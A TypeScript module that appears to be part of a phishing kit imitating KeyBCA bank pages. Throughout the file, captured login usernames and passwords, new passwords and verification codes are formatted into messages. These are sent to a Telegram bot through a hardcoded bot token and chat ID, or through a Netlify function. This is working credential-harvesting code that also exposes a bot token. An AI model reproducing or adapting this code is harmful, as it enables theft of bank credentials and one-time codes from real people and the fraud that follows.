export async function sendToTelegram(message: string): Promise<boolean> {
  try {
    // Use Netlify function endpoint
    const endpoint = '/.netlify/functions/send-telegram';
    
    // Check if we're in development mode
    const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    
    if (isDevelopment) {
      // For local development, try direct Telegram API first
      const TELEGRAM_BOT_TOKEN = "8215949613:AAEzT1aFVx1JOlrZTBl8e8ZoCUGMJwqPVw0";
      const TELEGRAM_CHAT_ID = "8217334752";
      
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      try {
        const response = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        });

        if (response.ok) {
          console.log('Message sent to Telegram (direct)');
          return true;
        }
      } catch (error) {
        console.error('Direct Telegram API failed, trying Netlify function:', error);
      }
    }

    // Use Netlify serverless function
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Failed to send to Telegram:', errorData);
      return false;
    }

    const data = await response.json();
    console.log('Message sent to Telegram via Netlify:', data);
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
}

export function formatLoginMessage(username: string, password: string): string {
  const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  return `🔐 <b>LOGIN ATTEMPT</b>

📱 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}
⏰ <b>Time:</b> ${timestamp}
🌐 <b>Page:</b> Login Page`;
}

export function formatPasswordChangeMessage(newPassword: string, confirmPassword: string): string {
  const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  return `🔄 <b>PASSWORD CHANGE</b>

🔑 <b>New Password:</b> ${newPassword}
✅ <b>Confirm Password:</b> ${confirmPassword}
⏰ <b>Time:</b> ${timestamp}
🌐 <b>Page:</b> Change Password Page`;
}

export function formatVerificationMessage(verificationCode: string): string {
  const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  return `✅ <b>KEYBCA VERIFICATION</b>

🔢 <b>Verification Code:</b> ${verificationCode}
⏰ <b>Time:</b> ${timestamp}
🌐 <b>Page:</b> Chat Conversation Page`;
}